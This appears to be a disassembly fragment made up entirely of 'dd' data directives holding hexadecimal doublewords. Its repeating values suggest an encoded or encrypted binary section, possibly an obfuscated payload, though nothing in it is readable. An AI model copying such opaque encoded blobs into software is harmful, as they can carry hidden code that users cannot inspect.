		dd 0EFEDBFEFh, 0FEC4FD00h, 9A7E20C6h, 649BD2DCh, 0A935594h
		dd 78BEFFDh, 0A776E73Ch, 0B8E69B08h, 0FD00F945h, 65E97864h
		dd 0F94598h, 0C41C67FDh, 64E97864h, 0C9DCF558h,	0EBB96777h
		dd 66BA00EFh, 0C67E978h, 0E94864E2h, 0F941B864h, 89AEFD00h
		dd 4466FBB5h, 0C49B00FFh, 0EA3C9BCFh, 4590669Bh, 62FD00F9h
		dd 891FCA54h, 0FD16536Dh, 0CBA98BEFh, 66F51620h, 81A85376h
		dd 89FD00E5h, 9891AD3h,	0FD165745h, 663303EFh, 0F94188h
		dd 0A989A5FDh, 677620CBh, 0EFEBBCh, 766619CEh, 0EFF7BE5Fh
		dd 0FF4200h, 32BEFFDh, 8983CFD4h, 8B892F33h, 0FD0A536Dh
		dd 3C078BEFh, 8A776E7h,	45B8E69Bh, 64FD00F9h, 9865E978h
		dd 0FD00F945h, 64C41C67h, 5864E978h, 77C9DCF5h,	0EFEBB967h
		dd 7866BA00h, 0E20C67E9h, 64E94864h, 0F941B8h, 0B589AEFDh
		dd 0FF4466FBh, 0CFC49B00h, 9BEA3C9Bh, 0F9459066h, 5462FD00h
		dd 6D891FCAh, 0EFFD1653h, 20CBA98Bh, 7666F616h,	0EFF7BC57h
		dd 0E73C9B00h, 45B8E69Bh, 0ECFD00F9h, 0BC6774CEh, 7600EFEBh
		dd 0EFEBBC67h, 0E167E00h, 3F83B183h, 3C0F8B12h,	8A776E6h
		dd 45B0E69Bh, 64FD00F9h, 9865E970h, 0FD00F945h,	64CC1C67h
		dd 7864E970h, 77C9DCF5h, 0EFEBB967h, 7066BB00h,	0C30C67E9h
		dd 64E94864h, 0F941B0h,	0B589AEFDh, 0FF4466FBh,	0CEC49B00h
		dd 7EEA3C9Bh, 5F74F229h, 0EFEBBCh, 4590669Bh, 6FD00F9h
		dd 0EFFF47h, 2EFD2D7Eh,	7FF4660Dh, 0EFEBB8h, 14022E7Eh
		dd 0EFFD02C2h, 0FE50783h, 0FD01F972h, 53758BEFh, 33EFFD16h
		dd 4D8B890Bh, 0EFFD0A2Dh, 0EFEDBFh, 0C6FEC4FDh,	0DC9B7E20h
		dd 90649BD2h, 0FD00E53Dh, 82EFA64h, 66E7B58Bh, 0EBB857F4h
		dd 977600EFh, 0B8777714h, 7500EFEBh, 977639F3h,	8B77614h
		dd 758A26CEh, 0EFFD1656h, 14977447h, 761FE375h,	577614A7h
		dd 0EFEBBCh, 0E94866BCh, 0EFEDB989h, 6620D666h,	7466052Eh
		dd 0EFEBB87Fh, 37BB7000h, 4190660Dh, 64FD00F9h,	0EBCFD954h
		dd 458B89E4h, 0EFFD0A2Fh, 66082E66h, 0EBB857F4h, 21FE00EFh
		dd 16537589h, 758BEFFDh, 0EFFD1653h, 7EE20483h,	0C26CA3h
		dd 92EF264h, 66E7B58Bh,	0EBB85FF4h, 9F7600EFh, 0B8777714h
		dd 7500EFEBh, 9F7631F3h, 8977614h, 758A26CEh, 0EFFD1656h
		dd 149F7446h, 763EE375h, 5F7614A7h, 0EFEBBCh, 0E94866BCh
		dd 0EFEDB989h, 6621D666h, 3B83052Eh, 534D891Ch,	66EFFD16h
		dd 0EBB87F74h, 0C71400EFh, 83EFFD01h, 1FD3123Fh, 576D0989h
		dd 83EFFD16h, 0F3E9EC3Ch, 64FD00EEh, 0F94188h, 9BF6DCFDh
		dd 0E53BB064h, 1050FD00h, 0D600EFFDh, 91323B11h, 663DCE66h
		dd 0F7C47F76h, 157600EFh, 48641AD3h, 450989F5h,	0EFFD1657h
		dd 8AFB858Bh, 0FD165765h, 0D6E188EFh, 8BFB858Bh, 3433E7A5h
		dd 0F9448865h, 89A8FD00h, 0F188FB85h, 0FBB58BF0h, 1653458Bh
		dd 7441EFFDh, 569B14A7h, 2B89FD10h, 17D38932h, 576D8989h
		dd 8DEFFD16h, 74F0D8A9h, 0EFEBBC7Fh, 24BB7600h,	9B1904DDh
		dd 0E539B864h, 0D389FD00h, 4509891Ah, 0EFFD1657h, 88663303h
		dd 0FD00F941h, 0F9418864h, 0F96CFD00h, 7E5B91F4h, 1D76F52Dh
		dd 48641BD3h, 4D0989F5h, 0EFFD1657h, 8AFB8D8Bh,	0FD165765h
		dd 0DEE188EFh, 8BFB8D8Bh, 3433E785h, 0F9448865h, 89A9FD00h
		dd 0F188FB8Dh, 0FBB58BD1h, 16534D8Bh, 7441EFFDh, 569B14A7h
		dd 2B89FD10h, 17D38933h, 660AC66Ch, 0F941B0h, 6D8989FDh
		dd 0EFFD1657h, 0C26CE8EBh, 9BE23C08h, 0F94590E6h, 0C16CFD00h
		dd 418866FAh, 64FD00F9h, 33F3D95Ch, 74DB6A2Fh, 9AED2483h
		dd 65440Ch, 0FEBEEFFDh,	4FD00EFh, 7504C61Ah, 0FD0656F1h
		dd 0EC4300EFh, 0EBEFFD00h, 0FD0756F7h, 0EB4300EFh, 8BEFFD00h
		dd 7624CB91h, 6CE92493h, 89A0F9C5h, 7424CB91h, 0E0E92493h
		dd 0FF151F85h, 0A35FB202h, 0E73983B4h, 907F6DC3h, 6D907F6Dh
		dd 7F6D907Fh, 4CBB98Bh,	0CE08037Eh, 4F6D8B26h, 53EFFD16h
		dd 0D96C64A8h, 6AAA56F7h, 706BF2D2h, 7600EFFEh,	0EFEBA47Fh
		dd 3310CE00h, 0C18B8926h, 776D8BA5h, 8AEFFD16h,	7841FEE1h
		dd 662E8B10h, 0FFBD94Ch, 0FD006478h, 937666EFh,	8864FF95h
		dd 0FD00F941h, 0EFFD1051h, 3B18D600h, 0CE5F9133h, 9B766619h
		dd 0D664FD95h, 0B58B0D2Eh, 7FF466E7h, 0EFEBB8h,	7714BF76h
		dd 0EFEBB877h, 11F37500h, 7614BF76h, 66BF08B7h,	0CA64E950h
		dd 6D8A3DCEh, 0EFFD1656h, 8BF6E988h, 6D8BFBB5h,	0EFFD1653h
		dd 14A77441h, 0FD10569Bh, 89372B89h, 4C6213D3h,	74661FC7h
		dd 0EFEBB85Fh, 2521400h, 7666EFFDh, 89FD95BBh, 9891FD3h
		dd 0FD16576Dh, 63203EFh, 0EFFFA7h, 758B34CEh, 0EFFD1653h
		dd 9843678Ah, 0B33FFFCh, 0F3D95C66h, 9D5B7666h,	0FD00EBFBh
		dd 0EFFD1052h, 8901D600h, 0C610CB89h, 648C7E22h, 33CFD96Ch
		dd 498B890Bh, 0EFF90472h, 8877600h, 1ED33176h, 57650989h
		dd 8BEFFD16h, 758AFBA5h, 0EFFD1657h, 8BC4F188h,	0CE43FBA5h
		dd 56758A26h, 89EFFD16h, 168BFBA5h, 67F55864h, 4864D60Ch
		dd 419864E9h, 0AEFD00F9h, 66FBB589h, 9B00FF44h,	3C9BCBC4h
		dd 24A376EEh, 0F64C62EDh, 0CBA18B1Fh, 0B0669B1Ch, 0FD00F945h
		dd 0F9418866h, 2404FD00h, 0DD248376h, 72518B89h, 0EFF904h
		dd 76E53C9Bh, 0EFEBBC67h, 0A8E69B00h, 0FD00F945h, 6774CEECh
		dd 0EFEBBCh, 959DDB76h,	6AED017Fh, 866BF2F6h, 7600EFFDh
		dd 76519DE3h, 1054ED01h, 0D600EFFDh, 53758B3Eh,	2BEFFD16h
		dd 83CBD423h, 64278BB4h, 0E33CF568h, 4598E69Bh,	64FD00F9h
		dd 8865E958h, 0FD00F945h, 64D60C67h, 33ACE958h,	44886534h
		dd 66FD00F9h, 0EB64E958h, 7508B776h, 0A7762BE3h, 0BC777614h
		dd 0BC00EFEBh, 89E94866h, 66EFEDB9h, 2E6624D6h,	7F746605h
		dd 0EFEBB8h, 0D33BB70h,	0F9419066h, 1104FD00h, 0F4660D2Eh
		dd 0EFEBB87Fh, 8921FE00h, 0FD165375h, 107C4FEFh, 0EFFC00h
		dd 2633E58Eh, 79519F65h, 0D04ED01h, 14C12076h, 652633E8h
		dd 1785199h, 0D96C64EDh, 53758BCBh, 33EFFD16h, 0FD10550Bh
		dd 649B00EFh, 89ED6074h, 0D61CCBA1h, 91373B39h,	663DCE6Ah
		dd 0FD9DBB76h, 64F56864h, 660C2EDAh, 0EBB877F4h, 0B77600EFh
		dd 0B8677714h, 7500EFEBh, 0B7762BE3h, 0C9DCBE14h, 0EBB96777h
		dd 0B77400EFh, 8B047614h, 0F188E7A5h, 0FBB58BC4h, 1653658Bh
		dd 7441EFFDh, 569B14A7h, 2B89FD10h, 0D96C6436h,	52E66CFh
		dd 0B87F7466h, 7000EFEBh, 640D33BBh, 89F3D95Ch,	0FD16536Dh
		dd 89E6EBEFh, 72A98Bh, 0DD248376h, 891FD389h, 16576D09h
		dd 3303EFFDh, 0F9418866h, 1464FD00h, 0FC903360h, 0E02F85FFh
		dd 0EF7984h, 600C64FDh,	0FFFC9ACFh, 0EFEDBEh, 76F9C4FDh
		dd 0EFEBBC67h, 3B1DD600h, 76599133h, 641BD318h,	989F548h
		dd 0FD16574Dh, 0FB8D8BEFh, 1657658Ah, 0E188EFFDh, 0FB8D8BDEh
		dd 33E7A58Bh, 44886534h, 0A9FD00F9h, 88FB8D89h,	0B58BF1F1h
		dd 534D8BFBh, 41EFFD16h, 9B14A774h, 89FD1056h, 5462332Bh
		dd 2E661FEBh, 536D8900h, 66EFFD16h, 0EBB85774h,	0FE1600EFh
		dd 9891AD3h, 0FD165745h, 663703EFh, 0F94188h, 0D94C64FDh
		dd 4F6D8BFBh, 3BEFFD16h, 6D82E037h, 6402FF13h, 0F94188h
		dd 9BF6DCFDh, 0EBFFB564h, 1055FD00h, 0D600EFFDh, 91373B39h
		dd 663DCE62h, 0F9007A76h
		dd 157600EFh, 48641AD3h, 450989F5h, 0EFFD1657h,	8AFB858Bh
		dd 0FD165765h, 0D6E188EFh, 8BFB858Bh, 3433E7A5h, 0F9448865h
		dd 89A8FD00h, 0F188FB85h, 0FBB58BF0h, 1653458Bh, 7441EFFDh
		dd 569B14A7h, 2B89FD10h, 17D38932h, 576D8989h, 8DEFFD16h
		dd 74F0D8A9h, 0EFEBBC7Fh, 66F61600h, 0F9007A76h, 3C9B00EFh
		dd 90E69BE2h, 0FD00F945h, 6774CEECh, 0EFEBBCh, 9B5F26CEh
		dd 0EBFF8D64h, 5DB1FD00h, 0EBB46774h, 6CA600EFh, 902CF5C4h
		dd 6D907F6Dh, 0CB898BB9h, 0C0904708h, 3D331C02h, 0EF698E62h
		dd 0C219FD00h, 9B069BFCh, 9AFD396Ch, 0C16CBD45h, 7EEA3EF9h
		dd 5831F17h, 0B8517E66h, 0FD00EFFDh, 6C9B349Ah,	0EF41BEh
		dd 0D775EFFDh, 27438389h, 0EFFD00h, 0DDB8CF88h,	62FD00EFh
		dd 0EEE98Eh, 0C48389FDh, 0AFF275EFh, 3DEB3C83h,	0FD00EEFDh
		dd 2FCEEF93h, 1573E5Eh,	0A300EFFDh, 7F6D902Ch, 8CBA98Bh
		dd 0F924A376h, 643D33B9h, 1097EF1h, 14D129F6h, 6AB7E03Eh
		dd 0D11F82D2h, 6DC3B115h, 0EBD94464h, 0BC677653h, 7E00EFEBh
		dd 0AF881016h, 8BE7B58Bh, 658AFBADh, 0EFFD1657h, 11F37556h
		dd 7614BF76h, 66BF089Fh, 0CA64E950h, 6D8A3DCEh,	0EFFD1656h
		dd 8BE1E988h, 0A341FBB5h, 0DCE94866h, 88669BC9h, 0FD00F945h
		dd 0F9418866h, 0C3B4FD00h, 8108167Eh, 0E7B58BDBh, 8AFBAD8Bh
		dd 0FD165765h, 0FEE188EFh, 33FBAD8Bh, 758AAD34h, 0EFFD1656h
		dd 66FBAD89h, 0EBB86774h, 677600EFh, 0EFEBBCh, 74F82E7Eh
		dd 0EFEBBC67h, 902CA600h, 6D907F6Dh, 0EBD94464h, 9064AB53h
		dd 0FD00F941h, 91F5FA6Ch, 8A7763Fh, 7714BF76h, 0EFEBB877h
		dd 11F37500h, 7614BF76h, 66BF089Fh, 0CA64E950h,	6D8A3DCEh
		dd 0EFFD1656h, 8BE1E988h, 0A341FBB5h, 0DCE94866h, 88669BC9h
		dd 0FD00F945h, 0F9418866h, 0C3B4FD00h, 2C3B26CEh, 0BF761691h
		dd 149F7608h, 0EBB87777h, 0F37500EFh, 14BF7632h, 0E95066BFh
		dd 677466B1h, 0EFEBB8h,	0EBBC6774h, 2CA600EFh, 907F6D90h
		dd 0D97464ABh, 7AB57E7h, 0FF100274h, 0E124AB76h, 6AF9C46Ch
		dd 24AB76C0h, 498628E9h, 0E7FD00F9h, 74EFFD00h,	0E94E64B4h
		dd 67F55664h, 5664EC04h, 0F57E64E9h, 0FBAB89ADh, 0D2DC378Bh
		dd 0E9883B77h, 0FBB38BD6h, 8AE7838Bh, 2FF6AE2Dh, 67E94E66h
		dd 7E64C414h, 0AC864E9h, 0A82F333Eh, 4E64288Ah,	0E97E66F5h
		dd 64F21467h, 89AEE94Eh, 2D8BFBB3h, 9B2F85A7h, 1A7701Fh
		dd 0ED24AB76h, 0FBAB8BBCh, 8AE7838Bh, 0C71C67E5h, 0ACE95E64h
		dd 5E66B440h, 0A6EA9AE9h, 7F3E5EB0h, 907F6D90h,	6D907F6Dh
		dd 9CBDF96Fh, 20167D15h, 500FE98Eh, 2C17D33Fh, 0D2DC3F8Bh
		dd 2E1F0E7Dh, 2FCEC307h, 832C2F33h, 0FF016BC0h,	0E388FFFFh
		dd 4CB89FFh, 9FA0FA02h,	2CA410EEh, 2EE7D68h, 0FC8487EDh
		dd 9B0210EDh, 0D507F124h, 7E00EFFCh, 103E0C2Bh,	0E8EBD974h
		dd 2FF1036h, 2FE6D818h,	48370A59h, 31CC233Eh, 8D112510h
		dd 2510ED01h, 0ED018D19h, 2331CC23h, 10EFC051h,	0B18DEFFDh
		dd 0FB8F08CBh, 10EF1481h, 0FD2DEFFDh, 6AFD00FFh, 10EFC001h
		dd 1173EFFDh, 2B76C8C4h, 0E164FC85h, 0BD8BE776h, 233E50EBh
		dd 620FD8FFh, 0D8FFFFFCh, 0FFFC6237h, 6223D8FFh, 7656FFFCh
		dd 0EE95E81Eh, 4419FD00h, 8901E7D9h, 301556E8h,	591002FFh
		dd 3F5E2976h, 0CA0200EBh, 10EE9FC8h, 0F524AB76h, 0E188C06Ah
		dd 183F839h, 0D37EFFFFh, 0EE910D10h, 0D64ED02h,	0ED018D69h
		dd 64FCF86Ch, 78E27409h, 8810EDFCh, 0EF7D68D0h,	1510FD00h
		dd 0ED018D01h, 4CA4C06Ah, 10EDFC84h, 3D33EB88h,	0CF7E6604h
		dd 16B5C00h, 0E568FFFFh, 87ED013Fh, 10EE2D00h, 0FF016F5Eh
		dd 0EF0BE8FFh, 510FD00h, 0ED02EE91h, 0D21659B6h, 399A3D85h
		dd 0FF016B5Ch, 9B3D85FFh, 80E27630h, 0AB10EDFCh, 0D4017162h
		dd 8BFD8FF0h, 89C96AF3h, 4E2CFFE8h, 10EDFC84h, 1604017Eh
		dd 0FA025005h, 10EE9FF4h, 0FC84CA7Eh, 0B6FD10EDh, 58EE975Eh
		dd 0A800E33Fh, 64AEEC64h, 8BB9F55Dh, 7657E388h,	19781092h
		dd 3D6CF475h, 0ED02EE91h, 6CDBEBEFh, 59BFCFEh, 8802117Eh
		dd 0EE81A1CDh, 0C06AED02h, 0AB57E689h, 6A2DFFBCh, 57E389C0h
		dd 0E8E8BCABh, 6A02FF10h, 33EB88C0h, 0AA4E043Dh, 0E1553B9h
		dd 831003C8h, 0B889EE03h, 6AF175E3h, 57D888C0h,	0CE8BCADh
		dd 6A02FF11h, 83EA89F6h, 0DB75EC03h, 7AE56B8h, 0FF1003E0h
		dd 0FE752F78h, 6CF145CEh, 74EFF17Dh, 0FC7C4EECh, 2F7810EDh
		dd 56B8F574h, 74D010AEh, 0AA760CAAh, 5BB1A20Ch,	0FD0C2DA0h
		dd 8D592510h, 2510ED01h, 0ED018D61h, 8D652510h,	0CC23ED01h
		dd 9F44CA02h, 0CA0210EEh, 10EE9F08h, 9F04CA02h,	0CA0210EEh
		dd 10EE9F0Ch, 9F40CA02h, 0CA0210EEh, 10EE9F3Ch,	9F38CA02h
		dd 0CA0210EEh, 10EE9F34h, 9F30CA02h, 0CA0210EEh, 10EE9F2Ch
		dd 9F28CA02h, 0CA0210EEh, 10EE9F24h, 9F20CA02h,	0CA0210EEh
		dd 10EE9F1Ch, 9F18CA02h, 0CA0210EEh, 10EE9F14h,	9F10CA02h
		dd 0CA0210EEh, 10EE9E2Ch, 9E28CA02h, 0CA0210EEh, 10EE99C8h
		dd 99CCCA02h, 233110EEh, 5B3B708Dh, 0C8E91002h,	6202FE34h
		dd 0FF8E658Dh, 0B06A0602h, 6270FF10h, 0FF109C98h, 24DB014h
		dd 7515B810h, 8B06ED01h, 31FF1000h, 2331CC23h, 0E91FB08Bh
		dd 2FFB585h, 0EE662057h, 0FD9B1410h, 31CC1002h,	2331CC23h
		dd 0CC2331CCh, 31CC2331h, 60D4D64h, 0FF10A758h,	0FC9BA745h
		dd 12A9E9FFh, 0CC2302FFh, 31CC2331h, 2331CC23h,	0CC2331CCh
		dd 0ADF0AA76h, 10007D07h, 0B82CA4FFh, 0ED01748Dh, 10003106h
		dd 0CC2331FFh, 31CC2331h, 2331CC23h, 0FEB3708Bh, 3C831002h
		dd 39BFE9EBh, 8D6402FEh, 2FF11A1h, 6D1C16Ch, 0FF112B34h
		dd 35C6276h, 2E7EFF10h,	0D6C91454h, 65B81003h, 6ED0174h
		dd 0FF1001F2h, 31CC2331h, 2331CC23h, 0CC2331CCh, 7EF0A276h
		dd 0EA14042Eh, 8B1003D6h, 3C831FB0h, 3A07E9C3h,	4D6402FEh
		dd 0A9C16C0Dh, 1128EF06h, 0F0A276FFh, 147C2E7Eh, 1003D50Bh
		dd 1742DB8h, 1B006EDh, 2331FF10h, 0CC2331CCh, 31CC2331h
		dd 0EE617057h, 0FC731410h, 31CC1002h, 2331CC23h, 0E91FB08Bh
		dd 2FFB675h, 6C0D4D64h,	0DD06EDC1h, 45FF10FAh, 0FFFC9C27h
		dd 0FF1384E9h, 31CC2302h, 6114D64h, 0FF10A468h,	7EECA276h
		dd 5214102Eh, 0B8100207h, 0ED017305h, 10015906h, 0CC2331FFh
		dd 2E4A270h, 0EE9F74CAh, 9DC74510h, 0BEE9FFFCh,	2302FF13h
		dd 0CC2331CCh, 31CC2331h, 2331CC23h, 0FB7B708Dh, 0D8FF1002h
		dd 0FFFC629Bh, 172ADB8h, 12006EDh, 2331FF10h, 0CC2331CCh
		dd 31CC2331h, 0BFF94564h, 511FB08Bh, 2096C15h, 0E7398310h
		dd 9D9745C3h, 6E9FFFCh,	2302FF14h, 0CC2331CCh, 3086270h
		dd 9A14FF10h, 8D1003D9h, 2FE2B70h, 1C17E910h, 0A05702FEh
		dd 1410EE60h, 1002FB39h, 0FFD7708Dh, 0A8E91002h, 6202FE36h
		dd 0FF10F58Dh, 848A0602h, 3F45FF10h, 0E9FFFC9Dh, 2FF144Bh
		dd 11718D62h, 350602FFh, 70FF1124h, 10024862h, 610514FFh
		dd 0FDB81002h, 6ED0171h, 0FF100696h, 2386270h, 0FA14FF10h
		dd 8D1003D9h, 2FFE770h,	61A7E910h, 305702FFh, 1410EE63h
		dd 1002FB99h, 0FFD7708Dh, 8E91002h, 6202FE37h, 0FF10DD8Dh
		dd 2F3A0602h, 8F45FF11h, 0E9FFFC9Eh, 2FF14ABh, 10C58D62h
		dd 0D50602FFh, 70FF1125h, 10022862h, 55C514FFh,	6DB81002h
		dd 6ED0171h, 0FF100636h
		dd 2386270h, 5A14FF10h,	8D1003D8h, 2FFC770h, 9467E910h
		dd 0C05702FFh, 1410EE63h, 1002FBF9h, 0E9E7B08Dh, 2FF1323h
		dd 6294D62h, 0FF1001D6h, 14D0A270h, 1002FC21h, 0E90FB08Dh
		dd 2FF133Bh, 6254D62h, 0FF1001BEh, 14DCA270h, 1002FC59h
		dd 830BB88Bh, 3D85EE1Dh, 0EFF584E0h, 4D64FD00h,	1A006F9h
		dd 623EFF10h, 9706154Dh, 70FF1001h, 6014ECA2h, 0B81002FCh
		dd 0ED01710Dh, 1007B506h, 0CC2331FFh, 31CC2331h, 2331CC23h
		dd 0CC2331CCh, 14F0A270h, 1002FC81h, 170A5B8h, 79406EDh
		dd 2331FF10h, 0CC2331CCh, 31CC2331h, 2331CC23h,	0E92BB08Dh
		dd 2FF13B3h, 6414D62h, 0FF100146h, 14C0A270h, 1002FCD1h
		dd 0E91FB08Dh, 2FF13CBh, 6114D62h, 0FF10012Eh, 14E8A270h
		dd 1002FCC9h, 0E90BB08Dh, 2FF13E3h, 61D4D62h, 0FF100116h
		dd 14DCA270h, 1002FCE1h, 0E937B08Dh, 2FF13FBh, 6294D62h
		dd 0FF1006FEh, 14D0A270h, 1002FB19h, 0E923B08Dh, 2FF1413h
		dd 6354D62h, 0FF1006E6h, 0FC9F6F45h, 15F1E9FFh,	0CC2302FFh
		dd 31CC2331h, 6F94D62h,	0FF1006CEh, 14F0A270h, 1002FB29h
		dd 14FEDB8h, 4EC06EDh, 2331FF10h, 0CC2331CCh, 14C0A270h
		dd 1002FB41h, 0E953B08Dh, 2FF145Bh, 6454D62h, 0FF10069Eh
		dd 14F0A270h, 1002FB79h, 0E903B08Dh, 2FF1473h, 6154D62h
		dd 0FF100686h, 14E4A270h, 1002FB91h, 0E90FB08Dh, 2FF148Bh
		dd 6214D62h, 0FF10066Eh, 14D8A270h, 1002FB89h, 0E93BB08Dh
		dd 2FF14A3h, 62D4D62h, 0FF100656h, 14CCA270h, 1002FBA1h
		dd 0E927B08Dh, 2FF14BBh, 6394D62h, 0FF10063Eh, 0FCA0AF45h
		dd 1699E9FFh, 0CC2302FFh, 31CC2331h, 2331CC23h,	0CC2331CCh
		dd 1404A270h, 1002FBF1h, 0E91FB08Dh, 2FF14EBh, 0EE5DD857h
		dd 0F9D31410h, 31CC1002h, 2331CC23h, 0E93FB08Dh, 2FF1503h
		dd 6354D62h, 0FF1007F6h, 14CCA270h, 1002FA01h, 0E91FB08Dh
		dd 2FF151Bh, 6114D62h, 0FF1007DEh, 14E8A270h, 1002FA39h
		dd 0E90BB08Dh, 2FF1533h, 61D4D62h, 0FF1007C6h, 14DCA270h
		dd 1002FA51h, 0E937B08Dh, 2FF154Bh, 6294D62h, 0FF1007AEh
		dd 0FCA1E745h, 1729E9FFh, 0CC2302FFh, 31CC2331h, 2331CC23h
		dd 0CC2331CCh, 1404A270h, 1002FA61h, 0E91FB08Dh, 2FF157Bh
		dd 0EE5C8057h, 0F8431410h, 31CC1002h, 2331CC23h, 0E937B08Dh
		dd 2FF1593h, 62D4D62h, 0FF100766h, 14D4A270h, 1002FAB1h
		dd 0E91FB08Dh, 2FF15ABh, 6114D62h, 0FF10074Eh, 14E8A270h
		dd 1002FAA9h, 0E90BB08Dh, 2FF15C3h, 61D4D62h, 0FF100736h
		dd 14DCA270h, 1002FAC1h, 14E4DB8h, 55406EDh, 2331FF10h
		dd 0CC2331CCh, 31CC2331h, 2331CC23h, 0E9EBB08Dh, 2FF15F3h
		dd 60D4D62h, 0FF100706h, 0FCA2F745h, 17D1E9FFh,	0CC2302FFh
		dd 31CC2331h, 113D8D62h, 0EB0602FFh, 70FF1004h,	1003B862h
		dd 0F90F14FFh, 708D1002h, 1002FE53h, 0FF1628E9h, 498D6202h
		dd 602FF11h, 0FF1004CAh, 3E46270h, 5014FF10h, 8D1002F9h
		dd 2FE3370h, 1649E910h,	8D6202FFh, 2FF1129h, 1004A906h
		dd 0CC6270FFh, 14FF1003h, 1002F971h, 0FE27708Dh, 6EE91002h
		dd 6202FF16h, 0FF11158Dh, 4880602h, 6270FF10h, 0FF1003C4h
		dd 2F99214h, 3708D10h, 0E91002FEh, 2FF168Fh, 112D8D62h
		dd 670602FFh, 70FF1004h, 1003E062h, 0F9B314FFh,	708D1002h
		dd 1002FE37h, 0FF16ACE9h, 5F485702h, 981410EEh,	0CC1002F7h
		dd 1404A270h, 1002F9D1h, 0E91FB08Dh, 2FF16CBh, 0EE5FE057h
		dd 0F7B31410h, 31CC1002h, 2331CC23h, 14CEDB8h, 0A4C06EDh
		dd 2331FF10h, 0CC2331CCh, 14F0A276h, 100254D7h,	14C65B8h
		dd 0A3406EDh, 2331FF10h, 0CC2331CCh, 31CC2331h,	2331CC23h
		dd 14C3DB8h, 0A1C06EDh,	2331FF10h, 0CC2331CCh, 14B0A276h
		dd 100254E7h, 835FB08Bh, 40E9CB3Ch, 6402FFB3h, 0E8BFF945h
		dd 2FF18C7h, 0F745C3B6h, 0E9FFFCA4h, 2FF1913h, 2331CC23h
		dd 0CC2331CCh, 14F0A276h, 10025337h, 831FB08Bh,	70E9CB3Ch
		dd 5702FFB3h, 10EE5950h, 2F62614h, 2331CC10h, 50EBB88Bh
		dd 2F61215h, 643E5910h,	0E8BFF945h, 2FF190Fh, 0AA76C3B6h
		dd 0E707AD04h, 0A4FF100Bh, 4B7DB82Ch, 9B06ED01h, 31FF100Bh
		dd 2331CC23h, 14B45B8h,	0B8C06EDh, 2331FF10h, 0CC2331CCh
		dd 0FCA5FF45h, 1981E9FFh, 0CC2302FFh, 31CC2331h, 6E4D4D64h
		dd 0EF75C1h, 0A12206FDh, 8745FF10h, 0E9FFFCA5h,	2FF19A3h
		dd 2331CC23h, 0CC2331CCh, 7CF0A276h, 0EFFD882Eh, 5CED1400h
		dd 6DB81002h, 6ED014Ah,	0FF100B3Eh, 31CC2331h, 2331CC23h
		dd 0FE47708Bh, 0D8E91002h, 5702FFBCh, 10EE58B8h, 2F6CE14h
		dd 2331CC10h, 0CC2331CCh, 31CC2331h, 60D4D64h, 0FF10AE08h
		dd 0FCA50F45h, 19F9E9FFh, 0CC2302FFh, 31CC2331h, 2331CC23h
		dd 0CC2331CCh, 14D4A270h, 1003DF07h, 149F5B8h, 8E406EDh
		dd 2331FF10h, 0CC2331CCh, 31CC2331h, 2331CC23h,	149CDB8h
		dd 8CC06EDh, 2331FF10h,	0CC2331CCh, 14F0A276h, 10025257h
		dd 14975B8h, 8B406EDh, 2331FF10h, 0CC2331CCh, 31CC2331h
		dd 2331CC23h, 5033B88Bh, 2F53215h, 573E5910h, 10EE5BB0h
		dd 2F57E14h, 0EFFD0010h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD015829h
		dd 0EFFCB80Bh, 0EE45D0h, 0FD015743h, 0EFFCB841h, 0EE459Ch
		dd 0FD015771h, 0EFFCB893h, 0EE4A38h, 0FD0158BBh, 0EFFCB7B5h
		dd 0EE4A68h, 0FD015885h, 0EFFCB765h, 0EE4A98h, 0FD015853h
		dd 0EFFCB755h, 0EE4AE4h, 0FD015809h, 0EFFCB8E9h, 0EE4516h
		dd 0FD0157D5h, 0EFFCB8D7h, 0EE4550h, 0FD015795h, 0EFFD00EFh
		dd 0EE44ACh, 0FD015635h, 0EFFD00EFh, 0EE4BF2h, 0FD0158F5h
		dd 0EFFCB657h, 0EE4BCCh, 0FD0158E9h, 0EFFCB647h, 0EE4BFEh
		dd 0FD01591Fh, 0EFFD00EFh, 0EE4DC4h, 0FD015F27h, 0EFFCB003h
		dd 0EE4DFCh, 0FD015EEFh, 0EFFCB1C5h, 0EE4C44h, 0FD015EADh
		dd 0EFFCB18Fh, 0EE4C70h, 0FD015E83h, 0EFFCB17Dh, 0EE4C9Eh
		dd 0FD015E49h, 0EFFCB12Bh, 0EE4CD0h, 0FD015E1Fh, 0EFFCB119h
		dd 0EE4DB0h, 0FD015DF7h, 0EFFCB2F7h, 0EE4F28h, 0FD015DC7h
		dd 0EFFCB2B9h, 0EE4F64h, 0FD015D89h, 0EFFCB26Dh, 0EE4F90h
		dd 0FD015D63h, 0EFFCB243h, 0EE4FC2h, 0FD015D2Fh, 0EFFCB203h
		dd 0EE4FF8h, 0FD015F5Fh, 0EFFCB069h, 0EE4D7Ah, 0FD015F99h
		dd 0EFFCB0BBh, 0EE4D3Ch, 0FD015FE7h, 0EFFCB0E1h, 0EE52F8h
		dd 0FD014011h, 0EFFCAF31h, 0EE52C6h, 0FD014053h, 0EFFCAF4Fh
		dd 0EE5288h, 0FD014091h, 0EFFCAFB3h, 0EE5250h, 0FD0140C3h
		dd 0EFFCAFC1h, 0EE521Ch, 0FD0140F3h, 0EFFCAE11h, 0EE53EEh
		dd 0FD01411Dh, 0EFFCAE39h, 0EE53CAh, 0FD014149h, 0EFFCAE49h
		dd 0EE5390h, 0FD01417Dh, 0EFFCAE9Dh, 0EE535Ch, 0FD0141BBh
		dd 0EFFCAED7h, 0EE5324h, 0FD0141E9h, 0EFFCAEEBh, 0EE51ECh
		dd 0FD01420Bh, 0EFFCAD0Fh, 0EE50D0h, 0FD014243h, 0EFFCAD47h
		dd 0EE509Ah, 0FD014271h, 0EFFCAD93h, 0EE5070h, 0FD01429Fh
		dd 0EFFCADBFh, 0EE5044h, 0FD0142C5h, 0EFFCADC7h, 0EE5018h
		dd 0FD0142FDh, 0EFFCAC17h
		dd 0EFFD00h, 7D00F520h,	6FFD03CFh, 80EFFEABh, 7D00EDE4h
		dd 6FFD1917h, 80EFF7CCh, 7D00FFDCh, 6FFD0371h, 80EFFE9Ch
		dd 7D00EC67h, 6FFD02F8h, 80EFFE5Ah, 7D00F5FAh, 6FFD03B3h
